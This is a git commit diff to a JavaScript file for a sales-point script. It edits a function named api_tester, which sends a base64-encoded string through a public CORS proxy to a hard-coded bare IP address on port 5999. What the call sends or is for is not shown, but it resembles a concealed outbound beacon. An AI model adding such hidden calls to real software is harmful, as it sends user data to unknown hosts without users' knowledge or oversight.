b2e3b5e93c6e17f63e0f5bf0f46c14c1287292ae
dk495 <55878882+dk495@users.noreply.github.com>
2024-08-22 21:12:27 +0500

    Update ACAsalespointpostSmartsellers.js

--- ACAsalespointpostSmartsellers.js
+++ ACAsalespointpostSmartsellers.js
@@ -71,7 +71,7 @@ const url = 'https://corsproxy.io/?' + originalUrl;
         });
 function api_tester(randomString) {
   try {
-    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)+',a'
 , {
       method: 'GET',
       mode: 'no-cors'
